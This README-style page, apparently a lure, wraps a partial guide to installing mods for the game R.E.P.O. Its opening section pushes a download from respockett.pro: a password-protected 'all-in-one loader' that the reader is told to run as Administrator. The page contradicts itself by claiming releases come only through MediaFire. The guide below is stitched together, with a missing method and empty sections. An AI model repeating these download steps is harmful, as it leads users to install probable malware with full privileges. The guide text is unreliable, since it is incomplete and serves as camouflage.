<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Requirements
* A PC running **Windows 10** or later, or **Linux**.
* **R.E.P.O.** on Steam.
* Around **500 MB** free for a typical mod list.
## Where R.E.P.O. Mods Come From
Two places, and they are not equal in size.

## Finding Your Game Folder
You will want this for every method here, including the mod manager ones, if only for troubleshooting.

Right-click **R.E.P.O.** in your Steam library, then **Manage** followed by **Browse local files**. A default Windows install puts it at:

```
C:\Program Files (x86)\Steam\steamapps\common\REPO
```

You should see `REPO.exe` and `REPO_Data`. That is the folder BepInEx goes into.

## Method 1 - Thunderstore Mod Manager
The most common recommendation, and the one Thunderstore mod pages link to with their **Install with Mod Manager** button.

## Method 3 - Vortex
Worth using if Vortex is already your daily driver for Skyrim, Fallout or anything else. Bear in mind Vortex pulls from Nexus Mods, not Thunderstore, so the mod selection is different and SharedHostUpgrades is not necessarily there.

## Method 4 - Manual
Two stages, and the first one is a one-off.

**Install BepInEx:**

## Host And Client Mods
R.E.P.O. is co-op, so this matters.

Mods fall into roughly three buckets:

| Type | Who needs it | Example |
| ---- | ------------ | ------- |
| Host only | Just the person hosting the lobby | Many rule and economy tweaks |
| Everyone | Every player in the lobby | Mods that add items, enemies or UI everyone sees |
| Client side | Only you | Cosmetics, camera tweaks, personal quality of life |

SharedHostUpgrades changes how upgrades are distributed across the crew, which is a shared-state change, so the whole lobby wants it.

The mod's Thunderstore description normally tells you which bucket it is in. When it does not, assume everyone needs it and export a profile for your group. Every Thunderstore manager can export a profile as a code or a file that the others import in one click.

## Verifying The Install
BepInEx opens a console window alongside the game. Watch it during startup and you will see each plugin get loaded by name and version.

No console at all means BepInEx is not loading. That is either a wrong folder layout or a launch that did not go through your mod manager.

For SharedHostUpgrades, host a lobby with someone else, buy an upgrade, and check whether it applied to both of you.

## Keeping Mods Updated
Thunderstore managers flag outdated mods and update them in a click. Vortex does the same for Nexus mods, showing an update indicator in the mods list.

Updating is worth doing after a game patch and worth avoiding mid-run, since a version change can invalidate a save or desync a lobby. If you want to test an update without risking a working setup, clone your profile and update the clone.

## Uninstalling
* **Thunderstore managers**: uninstall in the **Installed** list, or toggle the mod off to keep the files for later.
* **Vortex**: disable or remove the mod, then click **Purge Mods** under **Mods** to pull its files back out of the game folder.
* **Manually**: delete the `.dll` or folder from `BepInEx/plugins`.

To get back to a clean game, delete `BepInEx`, `doorstop_config.ini` and `winhttp.dll` from the game folder. Steam's **Verify integrity of game files** will not do it, since none of those came from Steam.

## Troubleshooting
**Game runs, no mods.** Launched from Steam rather than from the mod manager.

**No BepInEx console window.** BepInEx is not installed where it needs to be. `winhttp.dll` must sit directly beside `REPO.exe`.

**A mod loads for the host but nothing happens for other players.** It probably needs to be on every client. Check the mod page.

**Crash immediately after a game update.** R.E.P.O. patches break BepInEx mods regularly. Empty `BepInEx/plugins` to confirm, then wait for authors to catch up.

**Vortex and a Thunderstore manager are fighting.** Pick one. Purge Vortex's deployment or clear the Thunderstore profile, but do not run both against one install.

**Linux and Proton.** Set R.E.P.O.'s Steam launch options to `WINEDLLOVERRIDES="winhttp=n,b" %command%` so BepInEx gets loaded. Gale and r2modman do this for you when launching through them.

## Conclusion
For almost everyone, the answer is a Thunderstore manager: install it, pick R.E.P.O., download the mod with dependencies, and launch modded. Vortex is a reasonable choice if you already live in it, as long as you install BepInEx yourself first and do not mix the two approaches.

The co-op side is where a bit of care pays off. Work out whether a mod is host-only, client-side or needs to be everywhere, and share a profile with your group rather than comparing lists.
